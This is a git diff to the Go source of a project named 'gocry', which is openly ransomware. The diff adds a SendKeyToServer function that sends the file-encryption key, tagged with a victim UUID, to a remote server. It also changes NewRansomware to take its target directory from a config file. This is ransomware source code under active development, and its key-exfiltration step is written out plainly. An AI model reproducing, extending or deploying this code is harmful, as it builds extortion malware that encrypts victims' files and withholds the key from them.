@@ -10,6 +10,7 @@ import (
 	"strings"
 
 	"github.com/awnumar/memguard"
+	"github.com/nireo/gocry/config"
 	"github.com/nireo/gocry/crypt"
 	"github.com/nireo/gocry/utils"
 	"github.com/nireo/gocry/victim"
@@ -170,16 +171,25 @@ func (rw *Ransomware) RemoveRansomFile() error {
 	return nil
 }
 
+// SendKeyToServer sends the encryption key with rsa encryption to the server.
+func (rw *Ransomware) SendKeyToServer() error {
+	if err := utils.EncryptionKeyToServer(rw.MemguardKey, rw.Data.UUID); err != nil {
+		return err
+	}
+
+	return nil
+}
+
 // NewRansomware creates a new ransomware instance given a starting directory.
 // This function automatically generates a 32-bit encryption key to encrypt files.
-func NewRansomware(toEncrypt string) (*Ransomware, error) {
+func NewRansomware() (*Ransomware, error) {
 	key, err := utils.Gen32BitKey()
 	if err != nil {
 		return nil, err
 	}
 
 	return &Ransomware{
-		RootDir:     toEncrypt,
+		RootDir:     config.GetConfig().RootDirectory,
 		MemguardKey: memguard.NewEnclave(key),
 		Data:        victim.NewVictimIndentifer(),
 	}, nil
